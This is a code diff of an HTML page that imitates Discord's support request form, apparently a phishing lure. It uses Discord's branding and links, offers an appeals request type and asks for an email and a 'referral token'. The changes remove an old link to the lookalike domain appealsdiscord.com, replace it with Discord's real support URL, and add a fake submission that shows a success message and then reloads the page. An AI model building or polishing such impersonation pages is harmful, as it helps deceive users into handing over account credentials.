@@ -5,17 +5,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Submit a Request</title>
-    <link rel="icon" type=" image/png " href="https://support.discord.com/hc/user_images/PRywUXcqg0v5DD6s7C3LyQ.jpeg">
+    <link rel="icon" type="image/png" href="https://support.discord.com/hc/user_images/PRywUXcqg0v5DD6s7C3LyQ.jpeg">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
+            background: url('https://images.unsplash.com/photo-1561948959-508f22598635') no-repeat center center fixed;
+            background-size: cover;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f0f0;
         }
 
         .container {
@@ -111,10 +112,44 @@
             border: none;
             margin-top: 20px;
             padding: 15px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.3s ease;
         }
 
         button:hover {
             background-color: #4752c4;
+        }
+
+        button:disabled {
+            background-color: #d3d3d3;
+            cursor: not-allowed;
+        }
+
+        button .spinner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #fff;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        button.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .file-input-wrapper {
@@ -136,6 +171,17 @@
             font-size: 14px;
             color: #555;
             margin-top: 10px;
+        }
+
+        /* Success message styling */
+        .success-message {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border-radius: 5px;
+            display: none;
         }
     </style>
     <script>
@@ -169,16 +215,6 @@
                 "description": "Description",
                 "attachments": "Pièces jointes (facultatif)",
                 "submit": "Soumettre"
-            },
-            "zh": {
-                "submit_request": "提交请求",
-                "help_with": "我们能帮您什么？",
-                "email": "您的电子邮件地址",
-                "help_type": "我们如何帮助您？",
-                "referral_token": "推荐令牌",
-                "description": "描述",
-                "attachments": "附件（可选）",
-                "submit": "提交"
             }
         };
 
@@ -190,6 +226,21 @@
             document.getElementById("description_label").innerText = translations[lang].description;
             document.getElementById("attachments_label").innerText = translations[lang].attachments;
             document.getElementById("submit_button").innerText = translations[lang].submit;
+        }
+
+        function handleSubmit() {
+            const submitButton = document.getElementById("submit_button");
+            submitButton.disabled = true;
+            submitButton.classList.add("loading");
+            submitButton.innerText = "Submitting...";
+
+            // Simulate a delay for the form submission (e.g., AJAX request)
+            setTimeout(function () {
+                document.getElementById("success-message").style.display = "block"; // Show success message
+                setTimeout(function () {
+                    location.reload(); // Reload the page after 3 seconds
+                }, 3000); // Wait for 3 seconds before reloading
+            }, 3000);
         }
     </script>
 </head>
@@ -206,17 +257,16 @@
                         <a href="#" onclick="changeLanguage('en')">English (US)</a>
                         <a href="#" onclick="changeLanguage('es')">Español</a>
                         <a href="#" onclick="changeLanguage('fr')">Français</a>
-                        <a href="#" onclick="changeLanguage('zh')">简体中文</a>
                     </div>
                 </div>
-                <a href="https://appealsdiscord.com/">Submit a request</a>
+                <a href="https://support.discord.com/hc/en-us/requests/new">Submit a request</a>
                 <a href="https://discord.com/login">Sign in</a>
             </div>
         </div>
 
         <h2 id="submit_request">Submit a request</h2>
 
-        <form action="#" method="post">
+        <form action="#" method="post" onsubmit="handleSubmit(); return false;">
             <label id="help_with" for="request-type">What can we help you with?</label>
             <select id="request-type" name="request-type">
                 <option value="appeals">Appeals & Age Update Requests</option>
@@ -240,8 +290,13 @@
                 <input type="file" id="attachment" name="attachment">
                 <span class="help-text">You can upload images or documents to help explain your request.</span>
             </div>
-            <button id="submit_button" type="submit">Submit</button>
+            <button id="submit_button" type="submit">Submit
+                <span class="spinner"></span>
+            </button>
         </form>
+
+        <!-- Success message -->
+        <div class="success-message" id="success-message">Your request has been submitted successfully!</div>
     </div>
 </body>
 
